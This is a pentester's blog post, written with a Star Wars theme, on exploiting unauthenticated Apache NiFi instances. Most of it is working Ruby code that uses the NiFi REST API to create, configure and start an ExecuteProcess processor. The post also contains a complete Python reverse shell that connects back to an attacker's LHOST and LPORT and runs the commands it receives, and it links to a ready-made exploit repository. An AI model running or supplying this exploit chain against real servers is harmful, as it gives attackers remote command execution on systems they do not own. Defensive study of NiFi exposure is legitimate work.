---
layout: page
sidebar: right
subheadline: 'Pentesting'
title:  "Vulnerable By Design?  Apache NiFi"
teaser: "A pentester's guide for combining Apache NiFi, and a hyperdrive to make the Kessel Run (aka execute a reverse shell) in <12 packets!"
breadcrumb: true
categories:
    - infosec
tags:
    - blog
    - infosec
    - post
    - pentesting
    - 'web applications'
image:
    thumb: /nifi-shell/shellwars-thumb.png
    title: /nifi-shell/nifi.png
---

Not too long ago...in this galaxy...
<figure style="text-align:center; margin:1em">
<img src="/images/nifi-shell/shellwars.png" alt="SHELL WARS">
<figcaption style="font-size:small;">
Credit: Star Wars Intro Creator
</figcaption>
</figure>

The EMPIRE has deployed a super powerful data processing application in the Apache system known as "NiFi" to a development environment to prepare it for final acceptance into prod.  Their goal: to mercilessly crunch numbers and...like....control the....umm...datacenter?  A band of rebels has been dispatched to gather information about this application and bring peace and prosperity to the galaxy...

# Apache NiFi - A Brief History
On a recent penetration test, my team came across a couple instances of Apache NiFi.  It's an application that none of us had ever heard of before, and for the first day of the engagement, we actually just spent most of our time trying to figure out what it did.  The only things we knew were that we could access it without authentication and it had a bunch of "Processors" that did a variety of things to help people in some way (I know - I'm a stickler for details).  According to a Wikipedia entry, Apache developed the application as a way of automating data flow between systems and based it off an NSA tool called "NiagraFiles" - hence the name NiFi.

The most recent version of NiFi at the time of writing is 1.8.0, but the application we found was running as version 1.2.0, so even though we didn't know just how far the rabbit hole was about to go, we figured we had some decent findings to report based on a cvedetails.com entry.  With that in hand, we got to work confirming the vulnerabilities existed and getting started on our reports.

Before I go any further, I also want to mention that the more time I spent looking at NiFi, the more interested I became in it for my own use.  It really has a nice flow structure and interface for data processing.  As long as you don't present it unprotected on a public facing server, it is a great application.
# A Small Hole - No Bigger Than a Womp Rat
As the test went on, one of my teammates discovered that if you used a certain type of processor provided by NiFi, you could actually run system commands and read the output.  The culprit was called "ExecuteProcess" and true to its name, it allowed users to run processes and then pass the data along in the flow to other nodes.  We started poking around running commands to gather information about the system, and before long, we tried and received a reverse shell. 

This explanation does not dive into the details of how painstaking the manual process for getting a shell is.  For a step by step guide (and a more serious one I might add), I recommend reading [this laconicwolf.com post](https://laconicwolf.com/2018/11/08/examining-code-execution-features-in-apache-nifi/) written by another member of the pentesting team, Jake Miller.

Or you can follow along and I'll show you how I automated the process in a Star Wars theme!
# From Light Speeder to Lightspeed
The most important tool for automating the exploitation of ExecuteProcess and get a shell is the NiFi REST API.  Not only is it well documented, but, for the most part, it hasn't changed dramatically between versions of the application.  Using the API one can write a client that is able to control all aspects of the application, including, but not limited to, creating processors, configuring settings, reading output, and most importantly, cleaning up when you're done.

I decided to use Ruby to write the API client because I like Ruby, and I don't care what anyone else says.  It has a simple HTTP gem for making web requests and parsing the responses, which was critical for this particular API because you have to keep track of data and reference back to it as you go.
# Step 1: Setting the Scene
Set your target with variables from the command line.  I won't tell you how to do that, but I used the OptionParser gem and made the target equal to TARGET, the listening host equal to LHOST, and the listening port equal to LPORT (crazy I know).

The most important part of building a NiFi flow using the API is knowing the process-group that you are working in.  NiFi's main work area is known as the "root" process group and can be enumerated via the endpoint http://server/nifi-api/process-groups/root.  Every action you take from start to finish occurs in this group, so I made it a global variable with a not-weird-at-all variable name.

```
DEATH_STAR = HTTP.get("#{TARGET}/process-groups/root").parse['id']
```

Another important data point to keep track of is the version of each item as it is built and configured.  If you don't reference the right version of an item, the API won't work with it.

```
def get_version(thing)
  response = HTTP.get("#{TARGET}/processors/#{thing['id']}")
  version = response.parse['revision']['version']
end
```

# Step 2: Building the Fastest Ship in the Galaxy
The processor is the workhorse of NiFi and "ExecuteProcess" is a particular type of processor that allows you to run system commands.  The NiFi API is very sensitive to the data that is sent, so between using Wireshark and Burp Proxy, there was a lot of trial and error to get these next parts just right.

```
def create_processor(name)
  processor = HTTP.post("#{TARGET}/process-groups/#{DEATH_STAR}/processors", 
  :json => { 
    :revision => { 
      :clientId => "",      # ClientId can be empty but is a required field
    :version => 0       # On creation version will always be 0
    }, 
    :component => {         # Type is a standard ExecuteProcess processor
      :type => "org.apache.nifi.processors.standard.ExecuteProcess", 
      :name => name,        # Name it whatever you want
      :position => {        # Where it shows up on the interface
        :x => 0, 
    :y => 0 
      } 
    } 
  }).parse
  return processor          # Redundant return call for my sanity
end
```

Now you can call create_processor with a name that makes sense and save the return value to a variable for later use.  I bolded that because it is important.  Choose whatever you want for a name, but make sure it is awesome.

```
millennium_falcon = create_processor("Millennium Falcon")
```

# Step 3: Customizing this Bucket of Bolts
After creating a processor, it is not configured in any useful way by default.  Thankfully, the API allows full control over processor settings.

```
def configure_processor(processor, command, command_args)
  configure = HTTP.put("#{TARGET}/processors/#{processor['id']}",
  :json => {
  :component => {
    :id => processor["id"],
    :name => processor["component"]["name"],
    :config => {
      :concurrentlySchedulableTaskCount => "1",    
      :schedulingPeriod => "10 sec",               
      :executionNode => "ALL",                     
      :penaltyDuration => "30 sec",                
      :yieldDuration => "1 sec",                   
      :bulletinLevel => "WARN",                    
      :schedulingStrategy => "TIMER_DRIVEN",       
      :comments => "",                             
      :autoTerminatedRelationships => ['success'], # Required for standalone processor
      :properties => {
     :Command => command,                      # Command to run
     "Command Arguments": command_args,        # Arguments to command
     "Batch Duration":"5 sec",                 # How often to write results
     "Redirect Error Stream":"false",          # We don't care about errors
     "Argument Delimiter":"}"                  # Set } to argument delimeter
      }                                            # because some arguments use
    },                                             # spaces. I'll explain later 
    :state => "STOPPED"                            # Don't start it just yet
    },
    :revision => {
      :clientId => "",                             
      :version => get_version(processor)           # Need correct version to update
    }
  }).parse
  return configure                                 # Redundant return
end
```

# Step 4: Put Laser Cannons On It
The configuration step above requires a command and then its command arguments separated by a '}'.  When you call the configure_processor method, these need to be set.  I chose '}' as an argument delimiter because it's not a popular character among command arguments so I shouldn't have to escape it later.  Putting a '}' after every argument sounds awful but you'll see why it isn't too big of a deal soon. 

I used python as the command to execute a reverse shell script.  For some reason (probably a good one), not all NiFi versions allow interactive bash to run in a processor so you can't use that handy /dev/tcp trick all the time.  It does work on 1.2.0, but this works on all versions if they aren't protected or installed on a server that doesn't have python.

```
command_args = "-c}\"import socket
import base64
import subprocess
HOST = '#{LHOST}'
PORT = #{LPORT}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
while 1:
  data = s.recv(1024)
  proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
  stdout_value = proc.stdout.read() + proc.stderr.read()
  s.send(stdout_value)
s.close()\""

configure_processor(millennium_falcon, "python", command_args)
```

Notice how only one '}' is required since there are only two arguments: -c and the script as a string.  See?  I told you it wasn't so bad.
# Step 5: Punch It
With everything set up, all that was left to do was hit engage on the hyperdrive.

```
def start_processor(processor)
  start_process = HTTP.put("#{TARGET}/processors/#{processor['id']}",
    :json => {
      :revision => {
        :clientId => "",
        :version => get_version(processor)
      },
      :component => {
        :id => processor["id"],
        :state => "RUNNING"
      }
  }).parse
  return start_process
end

start_processor(millennium_falcon)  # Execute python shell
sleep(1)                            # Gives the API some time to work
```

# Make the Kessel Run In <12 Packets
<figure style="text-align:center; margin:1em">
<img src="https://gph.to/2SB2nJg" alt="nifi-shell">
<figcaption style="font-size:x-small;">“It’s the ship that made the Kessel run in less than twelve parsecs. I’ve outrun Imperial starships. Not the local bulk cruisers, mind you. I’m talking about the big Corellian ships, now. She’s fast enough for you, old man.”</figcaption>
</figure>

And that is pretty much it.  The basics are creating a processor, setting it up to execute how you want, and letting it go to do the rest. 
# There's Always a Bigger Fish
The script I've outlined has some flaws, isn't really stealthy, and leaves a new processor running in NiFi, but guess what?  The API has functions that allow you to fix all of that to your liking!    Additionally, there are other processors like ExecuteScript that do similar things, giving you a mess of ways to get a shell on the system.  It's like a choose your own adventure application. 

For me, after I had a decent script running, I thought I would port it to Metasploit, so I did.  And let me tell you, I need to write a blog post on how I did that because it was an adventure through its own universe. 

So you can have your own fun playing with NiFi and exploiting it your own way, or if you stuck-up, half-witted, scruffy-looking ***nerf herders*** just want the script, its posted here too.

[NiFi-Shell Scripts](https://github.com/hansonryne/nifi-shells)
# Conclusion

For everyone's peace of mind, NiFi actually has a lot of security features built into it that will keep just anyone from being able to execute whatever they want.  This particular method only works on unauthenticated instances where role-based access is turned off.  And while you can find a lot of unprotected NiFi's out there with a Shodan search, if you follow the recommended deployment instructions from the Apache documentation, you will be as safe as an Ewok in his treehouse.

So that is how a rest API made me spend a couple hours automating a process to save about 15 minutes.  If you made it this far, feel free to put the relevant xkcd in the comments below.

***All the information provided in this post is for educational purposes only.
You shall not misuse the information to gain unauthorized access and/or write malicious programs.
The author is not responsible for misuse of this informatio**n*
